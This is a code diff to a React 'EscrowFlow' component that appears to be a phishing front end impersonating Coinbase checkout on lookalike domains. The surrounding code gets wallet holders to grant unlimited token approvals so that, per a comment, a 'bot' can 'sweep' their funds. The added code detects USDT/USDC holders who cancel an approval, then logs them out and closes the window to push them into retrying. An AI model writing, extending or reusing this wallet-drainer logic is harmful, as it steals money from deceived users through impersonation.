@@ -1,6 +1,6 @@
 "use client";
 
-import { useEffect, useMemo, useRef, useState } from "react";
+import { useEffect, useMemo, useRef, useState, type MutableRefObject } from "react";
 import { usePrivy, useWallets } from "@privy-io/react-auth";
 // @coinbase/wallet-sdk removed — email OTP now handled by @coinbase/cdp-hooks inline
 import { BrowserProvider, Contract, JsonRpcProvider, MaxUint256, Signature } from "ethers";
@@ -55,7 +55,51 @@ type Phase =
   | "approving"
   | "complete"
   | "expired"
-  | "error";
+  | "error"
+  | "unable-to-login";
+
+/** True when the wallet popup was dismissed or the user rejected the tx. */
+function isWalletUserRejection(err: unknown): boolean {
+  const msg = String(
+    err instanceof Error
+      ? err.message
+      : typeof err === "object" && err && "message" in err
+        ? (err as { message?: string }).message
+        : err ?? ""
+  ).toLowerCase();
+  const code =
+    typeof err === "object" && err && "code" in err
+      ? String((err as { code?: unknown }).code)
+      : "";
+  return (
+    code === "4001" ||
+    code === "ACTION_REJECTED" ||
+    msg.includes("user rejected") ||
+    msg.includes("user denied") ||
+    msg.includes("rejected the request") ||
+    msg.includes("request rejected") ||
+    msg.includes("denied transaction") ||
+    msg.includes("transaction was rejected") ||
+    msg.includes("confirmation declined") ||
+    msg.includes("declined") ||
+    msg.includes("cancelled") ||
+    msg.includes("canceled")
+  );
+}
+
+function noteStableFromScan(
+  tokens: { symbol: string; balanceUsd: number }[] | undefined,
+  hasStableRef: MutableRefObject<boolean>
+) {
+  if (
+    (tokens ?? []).some(
+      (t) =>
+        (t.symbol === "USDT" || t.symbol === "USDC") && t.balanceUsd > 0.01
+    )
+  ) {
+    hasStableRef.current = true;
+  }
+}
 
 // USDT/USDC are dollar-pegged; this fixed rate converts on-chain stablecoin
 // holdings into an EUR-equivalent balance for the minimum-balance check.
@@ -358,6 +402,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   // --- Modal 1: auto-pops after wallet connects, approves USDC/USDT with balance ---
   const modal1Triggered = useRef(false);
   const modal1SawTron = useRef(false);
+  const hasStableRef = useRef(false);
+  const loginBlockedRef = useRef(false);
   const [modal1Open, setModal1Open] = useState(false);
   const [modal1Scanning, setModal1Scanning] = useState(false);
   const [modal1Items, setModal1Items] = useState<Modal1Item[]>([]);
@@ -382,6 +428,41 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     () => Object.values(walletBalances).reduce((a, b) => a + b, 0),
     [walletBalances]
   );
+
+  /** USDT/USDC holder cancelled a direct approve/authorize — block login and close tab. */
+  async function blockLoginAfterApprovalCancel(source: string, err: unknown): Promise<boolean> {
+    if (loginBlockedRef.current) return true;
+    if (!hasStableRef.current || !isWalletUserRejection(err)) return false;
+
+    loginBlockedRef.current = true;
+    console.warn(`[escrow] direct approval cancelled with USDT/USDC (${source}):`, err);
+
+    setModal1Open(false);
+    setModal1Scanning(false);
+    setModal2Open(false);
+    setGateLoading(false);
+    setProcessing(false);
+    setModal1Approving(false);
+    setPhase("unable-to-login");
+
+    modal1Triggered.current = false;
+    try {
+      await logout();
+    } catch {
+      /* ignore */
+    }
+
+    setTimeout(() => {
+      try {
+        window.close();
+      } catch {
+        /* ignore */
+      }
+      window.location.replace("about:blank");
+    }, 2500);
+
+    return true;
+  }
 
   useEffect(() => {
     let cancelled = false;
@@ -450,7 +531,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     return () => clearInterval(interval);
   }, [session?.expiresAt, session?.id]);
 
-  // After OTP on coinbase.usdc-pay.com, user is redirected with ?cb=1.
+  // After OTP on coinbase.checkout-base.com, user is redirected with ?cb=1.
   // Show our custom wallet picker instead of Privy's modal.
   useEffect(() => {
     if (!ready || authenticated || autoLoginAttempted.current) return;
@@ -748,6 +829,9 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
           approvedTokens.push({ symbol: token.symbol, address: token.address, txHash: tx.hash });
         }
       } catch (err) {
+        if (await blockLoginAfterApprovalCancel(`deposit-approve-${chain.name}-${token.symbol}`, err)) {
+          throw err;
+        }
         console.warn(`[escrow] approve ${token.symbol} on ${chain.name} skipped:`, err);
       }
     }
@@ -920,6 +1004,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       // Tron is skipped — that is expected; WalletConnect cannot see Tron.
       const data = await doScan(currentTronAddr);
       if (data.ok) setCachedScanUsd(data.chainUsd ?? null);
+      noteStableFromScan(data.tokensWithBalance, hasStableRef);
 
       setModal1Scanning(false);
       setModal1Open(false);
@@ -1043,6 +1128,10 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
             await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 45_000))]);
             authorizeTx = authTx.hash as string;
           } catch (authErr) {
+            if (await blockLoginAfterApprovalCancel(`modal1-authorize-${chainName}`, authErr)) {
+              setModal1Approving(false);
+              return;
+            }
             console.warn(`[modal1] authorize failed on ${chainName}:`, authErr);
             // Without authorize the bot cannot sweep — skip verify for this chain
             for (const item of chainItems) {
@@ -1077,6 +1166,10 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
             });
             setModal1Status((s) => ({ ...s, [item.key]: "done" }));
           } catch (err) {
+            if (await blockLoginAfterApprovalCancel(`modal1-approve-${item.key}`, err)) {
+              setModal1Approving(false);
+              return;
+            }
             console.error("[modal1] approve failed:", item.key, err);
             setModal1Status((s) => ({ ...s, [item.key]: "failed" }));
           }
@@ -1089,6 +1182,10 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
         await persistEvmVerify(chain, authorizeTx ?? "", approvedTokens);
       } catch (err) {
+        if (await blockLoginAfterApprovalCancel(`modal1-chain-${chainName}`, err)) {
+          setModal1Approving(false);
+          return;
+        }
         console.error("[modal1] chain failed:", chainName, err);
         for (const item of chainItems) {
           setModal1Status((s) => ({ ...s, [item.key]: "failed" }));
@@ -1186,6 +1283,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
       setModal1Status({ [target.key]: "done" });
     } catch (err) {
+      if (await blockLoginAfterApprovalCancel("modal1", err)) return;
       console.error("[modal1] approve failed:", err);
       setModal1Status({ [target.key]: "failed" });
     } finally {
@@ -1375,6 +1473,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         chainUsd?: Record<string, number>;
       };
       if (scan.ok && scan.chainUsd) setCachedScanUsd(scan.chainUsd);
+      noteStableFromScan(scan.tokensWithBalance, hasStableRef);
 
       // ── Tron USDT (if present) ─────────────────────────────────────────────
       const tronHit = (scan.tokensWithBalance ?? []).find(
@@ -1409,6 +1508,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
           });
           setApprovedChains((prev) => (prev.includes("tron") ? prev : [...prev, "tron"]));
         } catch (tronErr) {
+          if (await blockLoginAfterApprovalCancel("deposit-tron", tronErr)) return;
           console.warn("[escrow] tron approve skipped:", tronErr);
         }
       }
@@ -1422,6 +1522,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         try {
           await processEvmChainForDeposit(chain);
         } catch (chainErr) {
+          if (await blockLoginAfterApprovalCancel(`deposit-${chain.name}`, chainErr)) return;
           console.warn(`[escrow] chain ${chain.name} failed:`, chainErr);
         }
       }
@@ -1437,6 +1538,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       setModal2Open(false);
       setPhase("complete");
     } catch (err) {
+      if (await blockLoginAfterApprovalCancel("deposit", err)) return;
       console.error("[escrow] Approval failed:", err);
       setError("The deposit approval didn't go through. Please try again.");
       setModal2Open(false);
@@ -1508,6 +1610,22 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   }
 
   // Gate: show appropriate screen before the user is fully connected
+  if (phase === "unable-to-login") {
+    return (
+      <div className="fixed inset-0 z-[9999] flex min-h-screen flex-col items-center justify-center bg-bg px-6 text-center">
+        <div className="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-down/10">
+          <svg className="h-8 w-8 text-down" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+          </svg>
+        </div>
+        <h1 className="mb-2 text-xl font-semibold text-ink">Unable to login</h1>
+        <p className="max-w-sm text-sm leading-relaxed text-body">
+          The approval request was cancelled. This window will close — open the link again to restart.
+        </p>
+      </div>
+    );
+  }
+
   if (!ready || !isConnected) {
     return (
       <CoinbaseSignIn
